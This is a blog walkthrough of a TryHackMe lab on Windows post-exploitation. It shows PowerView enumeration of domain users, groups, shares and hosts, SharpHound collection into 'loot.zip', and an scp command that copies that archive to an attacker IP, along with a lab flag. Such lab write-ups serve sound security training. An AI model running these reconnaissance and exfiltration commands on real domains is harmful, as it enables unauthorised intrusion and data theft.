<!DOCTYPE html><html lang="en" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>TryHackMe - Windows Post-exploitation basics | amirr0r</title><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="TryHackMe - Windows Post-exploitation basics" /><meta name="author" content="amirr0r" /><meta property="og:locale" content="en_US" /><meta name="description" content="This room from TryHackMe cover some basic tools used during Windows Post-exploitation such as PowerView, Bloodhound and mimikatz." /><meta property="og:description" content="This room from TryHackMe cover some basic tools used during Windows Post-exploitation such as PowerView, Bloodhound and mimikatz." /><link rel="canonical" href="https://amirr0r.github.io/posts/thm-windows-post-exploitation-basics/" /><meta property="og:url" content="https://amirr0r.github.io/posts/thm-windows-post-exploitation-basics/" /><meta property="og:site_name" content="amirr0r" /><meta property="og:image" content="https://amirr0r.github.io/assets/img/thm/windows/windows-post-exploitation-basics/windows-post-exploitation-basics.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-06-28T20:27:55+02:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://amirr0r.github.io/assets/img/thm/windows/windows-post-exploitation-basics/windows-post-exploitation-basics.png" /><meta property="twitter:title" content="TryHackMe - Windows Post-exploitation basics" /><meta name="twitter:site" content="@amirr0r_" /><meta name="twitter:creator" content="@amirr0r" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"This room from TryHackMe cover some basic tools used during Windows Post-exploitation such as PowerView, Bloodhound and mimikatz.","headline":"TryHackMe - Windows Post-exploitation basics","dateModified":"2021-06-28T20:27:55+02:00","datePublished":"2021-06-28T20:27:55+02:00","@type":"BlogPosting","image":"https://amirr0r.github.io/assets/img/thm/windows/windows-post-exploitation-basics/windows-post-exploitation-basics.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://amirr0r.github.io/posts/thm-windows-post-exploitation-basics/"},"url":"https://amirr0r.github.io/posts/thm-windows-post-exploitation-basics/","author":{"@type":"Person","name":"amirr0r"},"@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/assets/js/post.min.js" async></script> <script src="/app.js" defer></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">amirr0r</a></div><div class="site-subtitle font-italic"></div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <!-- Switch the mode between dark and light. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightkMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightkMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/amirr0r" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/amirr0r_" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/in/amir-barnat/?locale=en_US" target="_blank"> <i class="fab fa-linkedin-in"></i> </a> <a href="/feed.xml" > <i class="fas fa-rss"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Refactor the HTML structure. --> <!-- Suroundding the markdown table with '<div class="table-wrapper">. and '</div>' --> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>TryHackMe - Windows Post-exploitation basics</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Jun 28, 2021, 8:27 PM +0200" > Jun 28, 2021 <i class="unloaded">2021-06-28T20:27:55+02:00</i> </span> by <span class="author"> amirr0r </span></div><div> Updated <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Aug 14, 2021, 12:41 AM +0200" > Aug 14, 2021 <i class="unloaded">2021-08-14T00:41:46+02:00</i> </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/thm/windows/windows-post-exploitation-basics/windows-post-exploitation-basics.png" class="post-preview-img"><p>This <a href="https://tryhackme.com/room/postexploit">room</a> from TryHackMe cover some basic tools used during Windows Post-exploitation such as <code class="language-plaintext highlighter-rouge">PowerView</code>, <code class="language-plaintext highlighter-rouge">Bloodhound</code> and <code class="language-plaintext highlighter-rouge">mimikatz</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="c"># RDP</span>
xfreerdp /u:&lt;USER&gt; /p:&lt;PASSWORD&gt; /v:&lt;IP&gt; /cert:ignore

rdesktop <span class="nt">-u</span> &lt;USER&gt;  <span class="nt">-p</span> &lt;PASSWORD&gt; &lt;IP&gt;:3389

<span class="c"># OR SSH</span>
ssh Administrator@10.10.180.147
</pre></table></code></div></div><hr /><h2 id="enumeration-w-powerview">Enumeration w/ <code class="language-plaintext highlighter-rouge">PowerView</code></h2><p><code class="language-plaintext highlighter-rouge">PowerView</code> is a powerful powershell script from powershell empire that can be used for enumerating a domain after you have already gained a shell in the system.</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="w"> </span><span class="mi">2018</span><span class="w"> </span><span class="n">Microsoft</span><span class="w"> </span><span class="nx">Corporation.</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nx">rights</span><span class="w"> </span><span class="nx">reserved.</span><span class="w">

</span><span class="n">controller\administrator</span><span class="err">@</span><span class="nx">DOMAIN-CONTROLL</span><span class="w"> </span><span class="nx">C:\Users\Administrator</span><span class="err">&gt;</span><span class="nx">powershell</span><span class="w"> </span><span class="nt">-ep</span><span class="w"> </span><span class="nx">bypass</span><span class="w">
</span><span class="n">Windows</span><span class="w"> </span><span class="nx">PowerShell</span><span class="w">
</span><span class="n">Copyright</span><span class="w"> </span><span class="p">(</span><span class="n">C</span><span class="p">)</span><span class="w"> </span><span class="n">Microsoft</span><span class="w"> </span><span class="nx">Corporation.</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nx">rights</span><span class="w"> </span><span class="nx">reserved.</span><span class="w">

</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="nx">\Downloads\PowerView.ps1</span><span class="w">
</span></pre></table></code></div></div><h3 id="enumerating-domain-users">Enumerating domain users</h3><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-NetUser</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">cn</span><span class="w"> 

</span><span class="n">cn</span><span class="w">                  
</span><span class="o">--</span><span class="w">                  
</span><span class="n">Administrator</span><span class="w">       
</span><span class="n">Guest</span><span class="w">                       
</span><span class="n">krbtgt</span><span class="w">                      
</span><span class="n">Machine-1</span><span class="w">                   
</span><span class="n">Admin2</span><span class="w">                      
</span><span class="n">Machine-2</span><span class="w">                   
</span><span class="n">SQL</span><span class="w"> </span><span class="nx">Service</span><span class="w">                 
</span><span class="n">POST</span><span class="p">{</span><span class="n">P0W3RV13W_FTW</span><span class="p">}</span><span class="w">         
</span><span class="n">sshd</span><span class="w"> 
</span></pre></table></code></div></div><h3 id="enumerating-domain-groups">Enumerating domain groups</h3><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-NetGroup</span><span class="w"> </span><span class="nt">-GroupName</span><span class="w"> </span><span class="o">*</span><span class="nx">admin</span><span class="o">*</span><span class="w"> 
</span><span class="n">Administrators</span><span class="w">                 
</span><span class="n">Hyper-V</span><span class="w"> </span><span class="nx">Administrators</span><span class="w">         
</span><span class="n">Storage</span><span class="w"> </span><span class="nx">Replica</span><span class="w"> </span><span class="nx">Administrators</span><span class="w"> 
</span><span class="n">Schema</span><span class="w"> </span><span class="nx">Admins</span><span class="w">                  
</span><span class="n">Enterprise</span><span class="w"> </span><span class="nx">Admins</span><span class="w">              
</span><span class="n">Domain</span><span class="w"> </span><span class="nx">Admins</span><span class="w">                  
</span><span class="n">Key</span><span class="w"> </span><span class="nx">Admins</span><span class="w">                     
</span><span class="n">Enterprise</span><span class="w"> </span><span class="nx">Key</span><span class="w"> </span><span class="nx">Admins</span><span class="w">          
</span><span class="n">DnsAdmins</span><span class="w">
</span></pre></table></code></div></div><h3 id="enumerating-shared-folders">Enumerating shared folders</h3><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-WmiObject</span><span class="w"> </span><span class="nt">-class</span><span class="w"> </span><span class="nx">Win32_Share</span><span class="w"> 

</span><span class="n">Name</span><span class="w">     </span><span class="nx">Path</span><span class="w">                                              </span><span class="nx">Description</span><span class="w">         
</span><span class="o">----</span><span class="w">     </span><span class="o">----</span><span class="w">                                              </span><span class="o">-----------</span><span class="w">
</span><span class="n">ADMIN</span><span class="err">$</span><span class="w">   </span><span class="nx">C:\Windows</span><span class="w">                                        </span><span class="nx">Remote</span><span class="w"> </span><span class="nx">Admin</span><span class="w">
</span><span class="n">C</span><span class="err">$</span><span class="w">       </span><span class="nx">C:\</span><span class="w">                                               </span><span class="nx">Default</span><span class="w"> </span><span class="nx">share</span><span class="w">
</span><span class="n">IPC</span><span class="err">$</span><span class="w">                                                       </span><span class="nx">Remote</span><span class="w"> </span><span class="nx">IPC</span><span class="w">
</span><span class="n">NETLOGON</span><span class="w"> </span><span class="nx">C:\Windows\SYSVOL\sysvol\CONTROLLER.local\SCRIPTS</span><span class="w"> </span><span class="nx">Logon</span><span class="w"> </span><span class="nx">server</span><span class="w"> </span><span class="nx">share</span><span class="w">
</span><span class="n">Share</span><span class="w">    </span><span class="nx">C:\Shares\Share</span><span class="w">
</span><span class="n">SYSVOL</span><span class="w">   </span><span class="nx">C:\Windows\SYSVOL\sysvol</span><span class="w">                          </span><span class="nx">Logon</span><span class="w"> </span><span class="nx">server</span><span class="w"> </span><span class="nx">share</span><span class="w">

</span></pre></table></code></div></div><h3 id="enumerating-operating-system">Enumerating operating system</h3><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-NetComputer</span><span class="w"> </span><span class="nt">-FullData</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">operatingsystem</span><span class="o">*</span><span class="w">

</span><span class="n">operatingsystem</span><span class="w">                  </span><span class="nx">operatingsystemversion</span><span class="w">
</span><span class="o">---------------</span><span class="w">                  </span><span class="o">----------------------</span><span class="w">
</span><span class="n">Windows</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="nx">2019</span><span class="w"> </span><span class="nx">Standard</span><span class="w">     </span><span class="nx">10.0</span><span class="w"> </span><span class="p">(</span><span class="mi">17763</span><span class="p">)</span><span class="w">
</span><span class="n">Windows</span><span class="w"> </span><span class="nx">10</span><span class="w"> </span><span class="nx">Enterprise</span><span class="w"> </span><span class="nx">Evaluation</span><span class="w"> </span><span class="nx">10.0</span><span class="w"> </span><span class="p">(</span><span class="mi">18363</span><span class="p">)</span><span class="w">
</span><span class="n">Windows</span><span class="w"> </span><span class="nx">10</span><span class="w"> </span><span class="nx">Enterprise</span><span class="w"> </span><span class="nx">Evaluation</span><span class="w"> </span><span class="nx">10.0</span><span class="w"> </span><span class="p">(</span><span class="mi">18363</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://amirr0r.github.io/assets/img/thm/windows/windows-post-exploitation-basics/enumerate-with-powerview.png" alt="" /></p><hr /><h2 id="enumeration-w-bloodhound">Enumeration w/ <code class="language-plaintext highlighter-rouge">Bloodhound</code></h2><p><code class="language-plaintext highlighter-rouge">Bloodhound</code> is a graphical interface that allows you to visually map out the network. This tool along with <code class="language-plaintext highlighter-rouge">SharpHound</code> which similar to <code class="language-plaintext highlighter-rouge">PowerView</code> takes the user, groups, trusts etc. of the network and collects them into <strong>.json</strong> files to be used inside of <code class="language-plaintext highlighter-rouge">Bloodhound</code>.</p><h3 id="installing-bloodhound">Installing <code class="language-plaintext highlighter-rouge">Bloodhound</code></h3><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>apt <span class="nb">install </span>bloodhound
</pre></table></code></div></div><h3 id="collecting-data-into-json-w-sharphound">Collecting data into json w/ <code class="language-plaintext highlighter-rouge">SharpHound</code></h3><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="nx">\Downloads\SharpHound.ps1</span><span class="w"> 
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Invoke-Bloodhound</span><span class="w"> </span><span class="nt">-CollectionMethod</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="nx">CONTROLLER.local</span><span class="w"> </span><span class="nt">-ZipFileName</span><span class="w"> </span><span class="nx">loot.zip</span><span class="w">

</span><span class="o">-----------------------------------------------</span><span class="w"> 
</span><span class="n">Initializing</span><span class="w"> </span><span class="nx">SharpHound</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">7:34</span><span class="w"> </span><span class="nx">AM</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">6/28/2021</span><span class="w">                                                                      
</span><span class="o">-----------------------------------------------</span><span class="w">                                                                      
   
</span><span class="n">Resolved</span><span class="w"> </span><span class="nx">Collection</span><span class="w"> </span><span class="nx">Methods:</span><span class="w"> </span><span class="nx">Group</span><span class="p">,</span><span class="w"> </span><span class="nx">Sessions</span><span class="p">,</span><span class="w"> </span><span class="nx">LoggedOn</span><span class="p">,</span><span class="w"> </span><span class="nx">Trusts</span><span class="p">,</span><span class="w"> </span><span class="nx">ACL</span><span class="p">,</span><span class="w"> </span><span class="nx">ObjectProps</span><span class="p">,</span><span class="w"> </span><span class="nx">LocalGroups</span><span class="p">,</span><span class="w"> </span><span class="nx">SPNTargets</span><span class="p">,</span><span class="w"> </span><span class="nx">Container</span><span class="w"> 
   
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Creating</span><span class="w"> </span><span class="nx">Schema</span><span class="w"> </span><span class="nx">map</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">domain</span><span class="w"> </span><span class="nx">CONTROLLER.LOCAL</span><span class="w"> </span><span class="nx">using</span><span class="w"> </span><span class="nx">path</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="n">Schema</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="kr">Configuration</span><span class="p">,</span><span class="n">DC</span><span class="o">=</span><span class="n">CONTROLLER</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="n">LOCAL</span><span class="w">     
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Cache</span><span class="w"> </span><span class="nx">File</span><span class="w"> </span><span class="nx">not</span><span class="w"> </span><span class="nx">Found:</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="nx">Objects</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">cache</span><span class="w">   
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Pre-populating</span><span class="w"> </span><span class="nx">Domain</span><span class="w"> </span><span class="nx">Controller</span><span class="w"> </span><span class="nx">SIDS</span><span class="w"> 
</span><span class="n">Status:</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="nx">objects</span><span class="w"> </span><span class="nx">finished</span><span class="w"> </span><span class="p">(</span><span class="o">+</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="o">--</span><span class="w"> </span><span class="kr">Using</span><span class="w"> </span><span class="mi">97</span><span class="w"> </span><span class="n">MB</span><span class="w"> </span><span class="nx">RAM</span><span class="w"> 
</span><span class="n">Status:</span><span class="w"> </span><span class="nx">66</span><span class="w"> </span><span class="nx">objects</span><span class="w"> </span><span class="nx">finished</span><span class="w"> </span><span class="p">(</span><span class="o">+</span><span class="mi">66</span><span class="w"> </span><span class="mi">8</span><span class="p">)</span><span class="n">/s</span><span class="w"> </span><span class="o">--</span><span class="w"> </span><span class="nx">Using</span><span class="w"> </span><span class="nx">102</span><span class="w"> </span><span class="nx">MB</span><span class="w"> </span><span class="nx">RAM</span><span class="w"> 
</span><span class="n">Enumeration</span><span class="w"> </span><span class="nx">finished</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">00:00:00.6725714</span><span class="w">                           
</span><span class="n">Compressing</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">C:\Users\Administrator\20210628073430_loot.zip</span><span class="w"> 
</span><span class="n">You</span><span class="w"> </span><span class="nx">can</span><span class="w"> </span><span class="nx">upload</span><span class="w"> </span><span class="nx">this</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">directly</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">UI</span><span class="w"> 

</span><span class="n">SharpHound</span><span class="w"> </span><span class="nx">Enumeration</span><span class="w"> </span><span class="nx">Completed</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">7:34</span><span class="w"> </span><span class="nx">AM</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">6/28/2021</span><span class="o">!</span><span class="w"> </span><span class="nx">Happy</span><span class="w"> </span><span class="nx">Graphing</span><span class="o">!</span><span class="w"> 
</span></pre></table></code></div></div><h3 id="transferring-the-lootzip-folder-to-our-attacker-machine">Transferring the loot.zip folder to our Attacker Machine</h3><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">scp</span><span class="w"> </span><span class="o">.</span><span class="nx">\20210628073430_loot.zip</span><span class="w"> </span><span class="nx">mimiron</span><span class="err">@</span><span class="nx">10.11.35.147:/tmp</span><span class="w"> 
</span><span class="n">mimiron</span><span class="err">@</span><span class="nx">10.11.35.147</span><span class="s1">'s password: 
20210628073430_loot.zip     100% 9559   298.7KB/s   00:00
</span></pre></table></code></div></div><h3 id="mapping-the-network-w-bloodhound">Mapping the network w/ <code class="language-plaintext highlighter-rouge">Bloodhound</code></h3><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="c"># Open a terminal and type the following:</span>
neo4j console <span class="c"># default credentials -&gt; neo4j:neo4j</span>
<span class="c"># In another terminal, open bloodhound:</span>
bloodhound 
